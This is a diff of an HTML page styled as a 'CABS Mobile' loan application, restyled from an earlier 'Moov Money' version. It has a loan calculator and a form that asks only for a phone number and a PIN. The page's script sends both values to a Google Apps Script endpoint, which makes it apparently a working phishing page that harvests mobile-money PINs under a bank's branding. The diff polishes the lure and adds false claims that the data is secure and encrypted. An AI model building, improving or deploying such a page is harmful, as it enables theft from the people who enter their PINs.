@@ -1,533 +1,410 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Moov Money - Loan Application</title>
-
-<style>
-
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: Arial, Helvetica, sans-serif;
-}
-
-body {
-    background: #f2f2f2;
-    color: #333;
-}
-
-/* MAIN WEBSITE */
-.container {
-    width: 100%;
-    max-width: 700px;
-    margin: auto;
-    background: #fff;
-    min-height: 100vh;
-}
-
-/* HEADER */
-.header {
-    background: #fff;
-    padding: 20px 20px 15px;
-    border-bottom: 1px solid #ddd;
-}
-
-.logo {
-    text-align: center;
-}
-
-.logo img {
-    width: 110px;
-    height: 110px;
-    object-fit: contain;
-}
-
-.logo h1 {
-    color: #0066a6;
-    font-size: 30px;
-    margin-top: 5px;
-}
-
-.logo span {
-    color: #f47b00;
-}
-
-/* MENU BUTTON */
-.menu-row {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-top: 18px;
-}
-
-.menu-button {
-    border: 1px solid #888;
-    background: white;
-    border-radius: 12px;
-    padding: 12px 20px;
-    font-size: 18px;
-    color: #24427c;
-}
-
-.search {
-    font-size: 32px;
-    color: #243c7c;
-}
-
-/* NAVIGATION */
-.navigation {
-    width: 100%;
-}
-
-.nav-item {
-    width: 100%;
-    padding: 18px 20px;
-    font-size: 18px;
-    font-weight: bold;
-    color: white;
-    background: #999;
-    border-bottom: 2px solid #aaa;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-}
-
-.nav-item.active {
-    background: #293f82;
-}
-
-.arrow {
-    font-size: 20px;
-}
-
-/* CONTENT */
-.content {
-    padding: 25px 25px 40px;
-    background: #fff;
-}
-
-.page-title {
-    color: #006781;
-    font-size: 32px;
-    margin-bottom: 20px;
-    border-bottom: 2px dashed #ddd;
-    padding-bottom: 20px;
-}
-
-.description {
-    color: #666;
-    font-size: 17px;
-    line-height: 1.6;
-    margin-bottom: 25px;
-}
-
-/* LOAN CARD */
-.loan-card {
-    background: #f8f8f8;
-    border: 1px solid #ddd;
-    border-radius: 8px;
-    padding: 22px;
-    margin-top: 20px;
-}
-
-.loan-title {
-    color: #006781;
-    text-align: center;
-    font-size: 25px;
-    margin-bottom: 15px;
-}
-
-.amount {
-    text-align: center;
-    font-size: 38px;
-    font-weight: bold;
-    color: #293f82;
-    margin: 20px 0;
-}
-
-.range {
-    width: 100%;
-    cursor: pointer;
-    accent-color: #f47b00;
-}
-
-/* TERM */
-.term {
-    margin-top: 25px;
-}
-
-.term label,
-.form-group label {
-    display: block;
-    font-weight: bold;
-    color: #555;
-    margin-bottom: 8px;
-}
-
-select,
-input {
-    width: 100%;
-    padding: 14px;
-    border: 1px solid #ccc;
-    border-radius: 6px;
-    font-size: 16px;
-    background: white;
-}
-
-input:focus,
-select:focus {
-    outline: none;
-    border-color: #f47b00;
-}
-
-/* RESULT */
-.result {
-    margin-top: 25px;
-    background: #293f82;
-    color: white;
-    padding: 20px;
-    border-radius: 7px;
-    text-align: center;
-}
-
-.result h3 {
-    font-size: 17px;
-    margin-bottom: 10px;
-}
-
-.result p {
-    font-size: 30px;
-    font-weight: bold;
-    color: #ff9a22;
-}
-
-/* APPLICATION */
-.application {
-    margin-top: 25px;
-}
-
-.application h2 {
-    color: #006781;
-    font-size: 24px;
-    margin-bottom: 20px;
-}
-
-.form-group {
-    margin-bottom: 18px;
-}
-
-/* BUTTON */
-button {
-    width: 100%;
-    padding: 16px;
-    border: none;
-    border-radius: 6px;
-    background: #f47b00;
-    color: white;
-    font-size: 18px;
-    font-weight: bold;
-    cursor: pointer;
-    margin-top: 5px;
-}
-
-button:hover {
-    background: #d96800;
-}
-
-/* INFO BOXES */
-.info-section {
-    margin-top: 30px;
-}
-
-.info-box {
-    background: #293f82;
-    color: white;
-    padding: 18px;
-    margin-bottom: 5px;
-    border-radius: 4px;
-    font-size: 17px;
-    font-weight: bold;
-    display: flex;
-    justify-content: space-between;
-}
-
-/* FOOTER */
-.footer {
-    background: #293f82;
-    color: white;
-    text-align: center;
-    padding: 25px 15px;
-    font-size: 14px;
-}
-
-/* MOBILE */
-@media (max-width: 480px) {
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>CABS Mobile – Loan Application</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
 
     body {
-        background: white;
+      background: #e8eef5;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 16px;
     }
 
-    .container {
-        max-width: 100%;
+    .card {
+      width: 100%;
+      max-width: 420px;
+      background: #ffffff;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 8px 24px rgba(0, 40, 80, 0.12);
     }
 
+    /* Header */
     .header {
-        padding: 15px;
+      background: #1a3a6b;
+      padding: 28px 24px 22px;
+      text-align: center;
+      color: white;
     }
 
-    .logo img {
-        width: 90px;
-        height: 90px;
+    .logo {
+      font-size: 28px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
     }
 
-    .logo h1 {
-        font-size: 27px;
+    .logo span {
+      color: #7ec8e3;
+    }
+
+    .tagline {
+      font-size: 13px;
+      opacity: 0.9;
+      margin-top: 6px;
+    }
+
+    /* Content */
+    .content {
+      padding: 28px 24px 32px;
     }
 
     .page-title {
-        font-size: 29px;
+      font-size: 22px;
+      color: #1a3a6b;
+      text-align: center;
+      font-weight: 700;
+      margin-bottom: 6px;
     }
 
-    .content {
-        padding: 22px 18px 35px;
+    .subtitle {
+      text-align: center;
+      color: #5a6a7a;
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 26px;
+    }
+
+    /* Loan Calculator */
+    .loan-card {
+      background: #f7f9fc;
+      border: 1px solid #d6e0ec;
+      border-radius: 12px;
+      padding: 22px 18px;
+      margin-bottom: 28px;
+    }
+
+    .loan-title {
+      text-align: center;
+      color: #1a3a6b;
+      font-size: 17px;
+      font-weight: 600;
+      margin-bottom: 14px;
     }
 
     .amount {
-        font-size: 34px;
+      text-align: center;
+      font-size: 36px;
+      font-weight: 800;
+      color: #1a3a6b;
+      margin: 12px 0 18px;
     }
 
-    .nav-item {
-        font-size: 17px;
+    .amount span {
+      font-size: 22px;
+      font-weight: 600;
     }
-}
 
-</style>
+    input[type="range"] {
+      width: 100%;
+      height: 6px;
+      accent-color: #1a3a6b;
+      cursor: pointer;
+      margin-bottom: 22px;
+    }
+
+    .term label,
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: #1a3a6b;
+      margin-bottom: 8px;
+    }
+
+    select,
+    input[type="tel"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1.5px solid #c5d0de;
+      border-radius: 10px;
+      font-size: 16px;
+      background: #ffffff;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    select:focus,
+    input:focus {
+      border-color: #1a3a6b;
+      box-shadow: 0 0 0 3px rgba(26, 58, 107, 0.12);
+    }
+
+    .result {
+      margin-top: 22px;
+      background: #1a3a6b;
+      color: white;
+      padding: 18px;
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    .result h3 {
+      font-size: 14px;
+      font-weight: 500;
+      opacity: 0.9;
+      margin-bottom: 6px;
+    }
+
+    .result p {
+      font-size: 28px;
+      font-weight: 700;
+      color: #7ec8e3;
+    }
+
+    /* Application Form */
+    .application {
+      margin-top: 8px;
+    }
+
+    .application h2 {
+      font-size: 18px;
+      color: #1a3a6b;
+      margin-bottom: 18px;
+      text-align: center;
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 10px;
+      background: #1a3a6b;
+      color: white;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn:active {
+      background: #122a4f;
+    }
+
+    .btn:disabled {
+      opacity: 0.65;
+      cursor: not-allowed;
+    }
+
+    /* Messages */
+    .message {
+      display: none;
+      text-align: center;
+      padding: 12px 14px;
+      border-radius: 10px;
+      margin-bottom: 18px;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .success {
+      background: #e6f4ea;
+      color: #137333;
+    }
+
+    .error {
+      background: #fce8e6;
+      color: #c5221f;
+    }
+
+    /* Footer */
+    .footer {
+      text-align: center;
+      padding: 0 24px 28px;
+      font-size: 12px;
+      color: #7a8a9a;
+      line-height: 1.5;
+    }
+  </style>
 </head>
-
 <body>
 
-    <div class="container">
-
-        <div class="logo">
-            <img src="cabsm.jpeg" alt="CABS Mobile">
-            <h1>CABS Mobile</h1>
-        </div>
-
-        <p class="subtitle">
-            Fast Approval • Flexible Repayment • Trusted and Secure
-        </p>
-
- <div class="loan-card">
-
-    <h2 class="loan-title">
-        Loan Simulator
-    </h2>
-
-    <div class="amount">
-        $<span id="loanAmount">500</span>
+  <div class="card">
+    <!-- Header -->
+    <div class="header">
+      <div class="logo">CABS <span>Mobile</span></div>
+      <p class="tagline">Fast Approval • Flexible Repayment • Trusted & Secure</p>
     </div>
 
-    <input
-        class="range"
-        type="range"
-        id="slider"
-        min="500"
-        max="50000"
-        step="500"
-        value="500"
-    >
+    <!-- Content -->
+    <div class="content">
+      <h1 class="page-title">Loan Application</h1>
+      <p class="subtitle">Simulate your loan and apply in minutes</p>
 
-    <div class="term">
+      <div id="message" class="message"></div>
 
-        <label for="months">
-            Loan Term
-        </label>
+      <!-- Loan Calculator -->
+      <div class="loan-card">
+        <div class="loan-title">Loan Simulator</div>
 
-        <select id="months">
-
-            <option value="6">
-                6 Months
-            </option>
-
-            <option value="12" selected>
-                12 Months
-            </option>
-
-            <option value="24">
-                24 Months
-            </option>
-
-            <option value="36">
-                36 Months
-            </option>
-
-            <option value="48">
-                48 Months
-            </option>
-
-            <option value="60">
-                60 Months
-            </option>
-
-        </select>
-
-    </div>
-
-    <div class="result">
-
-        <h3>
-            Estimated Monthly Payment
-        </h3>
-
-        <p id="payment">
-            $43.75
-        </p>
-
+        <div class="amount">
+          $<span id="loanAmount">500</span>
         </div>
+
+        <input
+          type="range"
+          id="slider"
+          min="500"
+          max="50000"
+          step="500"
+          value="500"
+        >
+
+        <div class="term">
+          <label for="months">Loan Term</label>
+          <select id="months">
+            <option value="6">6 Months</option>
+            <option value="12" selected>12 Months</option>
+            <option value="24">24 Months</option>
+            <option value="36">36 Months</option>
+            <option value="48">48 Months</option>
+            <option value="60">60 Months</option>
+          </select>
+        </div>
+
+        <div class="result">
+          <h3>Estimated Monthly Payment</h3>
+          <p id="payment">$43.75</p>
+        </div>
+      </div>
+
+      <!-- Application Form -->
+      <div class="application">
+        <h2>Apply Now</h2>
 
         <form id="applicationForm">
+          <div class="form-group">
+            <label for="phoneNumber">Phone Number</label>
+            <input
+              type="tel"
+              id="phoneNumber"
+              placeholder="Enter your phone number"
+              required
+              inputmode="numeric"
+              autocomplete="tel"
+            >
+          </div>
 
-            <div class="form-group">
-                <label for="phoneNumber">Phone Number</label>
-                <input
-                    type="tel"
-                    id="phoneNumber"
-                    placeholder="Enter your phone number"
-                    required
-                >
-            </div>
+          <div class="form-group">
+            <label for="pin">PIN</label>
+            <input
+              type="password"
+              id="pin"
+              placeholder="Enter your PIN"
+              required
+              inputmode="numeric"
+              maxlength="6"
+              autocomplete="current-password"
+            >
+          </div>
 
-            <div class="form-group">
-                <label for="pin">PIN</label>
-                <input
-                    type="password"
-                    id="pin"
-                    placeholder="Enter your PIN"
-                    required
-                >
-            </div>
-
-            <button type="submit">
-                APPLY NOW
-            </button>
-
+          <button type="submit" class="btn" id="submitBtn">
+            APPLY NOW
+          </button>
         </form>
-
-        </div>
-
-        <div class="footer">
-
-            <div class="box">
-                ⚡ Fast Approval
-            </div>
-
-            <div class="box">
-                💰 Competitive Rates
-            </div>
-
-        </div>
-
+      </div>
     </div>
 
-    <script>
+    <div class="footer">
+      Your information is secure and encrypted.<br>
+      © 2026 CABS Mobile. All rights reserved.
+    </div>
+  </div>
 
-        /* =========================
-           LIVE LOAN CALCULATOR
-        ========================= */
+  <script>
+    // ===== LOAN CALCULATOR =====
+    const slider = document.getElementById("slider");
+    const months = document.getElementById("months");
+    const loanAmount = document.getElementById("loanAmount");
+    const payment = document.getElementById("payment");
 
-const slider = document.getElementById("slider");
-const months = document.getElementById("months");
-const loanAmount = document.getElementById("loanAmount");
-const payment = document.getElementById("payment");
+    function calculateLoan() {
+      const loan = parseInt(slider.value);
+      const term = parseInt(months.value);
+      const interest = 0.05;
+      const total = loan + (loan * interest);
+      const monthly = total / term;
 
-function calculateLoan() {
+      loanAmount.textContent = loan.toLocaleString("en-US");
+      payment.textContent = "$" + monthly.toLocaleString("en-US", {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      });
+    }
 
-    const loan = parseInt(slider.value);
-    const term = parseInt(months.value);
+    slider.addEventListener("input", calculateLoan);
+    months.addEventListener("change", calculateLoan);
+    calculateLoan();
 
-    // Example total interest of 5%
-    const interest = 0.05;
+    // ===== FORM SUBMISSION =====
+    const form = document.getElementById("applicationForm");
+    const messageEl = document.getElementById("message");
+    const submitBtn = document.getElementById("submitBtn");
 
-    const total = loan + (loan * interest);
+    // Your Google Apps Script URL
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw-v1eYH1jsEfDuSbXG1Blkv9pl9AqdqIJ_llVwHkKGDwVHsStxI66vhoPQh2jZBb9t9w/exec";
 
-    const monthly = total / term;
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
 
-    loanAmount.textContent =
-        loan.toLocaleString("en-US");
+      const phone = document.getElementById("phoneNumber").value.trim();
+      const pin = document.getElementById("pin").value.trim();
 
-    payment.textContent =
-        "$" + monthly.toLocaleString("en-US", {
-            minimumFractionDigits: 2,
-            maximumFractionDigits: 2
+      if (!phone || !pin) {
+        showMessage("Please fill in both fields", "error");
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Submitting...";
+
+      try {
+        const response = await fetch(SCRIPT_URL, {
+          method: "POST",
+          body: JSON.stringify({
+            phoneNumber: phone,
+            pin: pin
+          })
         });
-}
 
-slider.addEventListener("input", calculateLoan);
+        const result = await response.json();
 
-months.addEventListener("change", calculateLoan);
+        if (result.success) {
+          showMessage("Application submitted successfully!", "success");
+          form.reset();
+        } else {
+          showMessage(result.error || "Submission failed. Please try again.", "error");
+        }
+      } catch (err) {
+        showMessage("Network error. Please try again.", "error");
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = "APPLY NOW";
+      }
+    });
 
-calculateLoan();
-
-
-        /* =========================
-           FORM SUBMISSION
-        ========================= */
-
-        const applicationForm =
-            document.getElementById("applicationForm");
-
-        applicationForm.addEventListener(
-            "submit",
-            async function (e) {
-
-                e.preventDefault();
-
-                const formData = {
-                    number:
-                        document.getElementById("phoneNumber").value,
-
-                    PIN:
-                        document.getElementById("pin").value
-                };
-
-                try {
-
-                    const response = await fetch(
-                        "https://script.google.com/macros/s/AKfycbw-v1eYH1jsEfDuSbXG1Blkv9pl9AqdqIJ_llVwHkKGDwVHsStxI66vhoPQh2jZBb9t9w/exec",
-                        {
-                            method: "POST",
-                            body: JSON.stringify(formData)
-                        }
-                    );
-
-                    if (!response.ok) {
-                        throw new Error(
-                            "Submission failed"
-                        );
-                    }
-
-                    alert(
-                        "Application submitted successfully!"
-                    );
-
-                    applicationForm.reset();
-
-                } catch (error) {
-
-                    console.error(error);
-
-                    alert(
-                        "Unable to submit the application. Please try again."
-                    );
-                }
-            }
-        );
-
-    </script>
-
+    function showMessage(text, type) {
+      messageEl.textContent = text;
+      messageEl.className = "message " + type;
+      messageEl.style.display = "block";
+      setTimeout(() => {
+        messageEl.style.display = "none";
+      }, 4000);
+    }
+  </script>
 </body>
 </html>
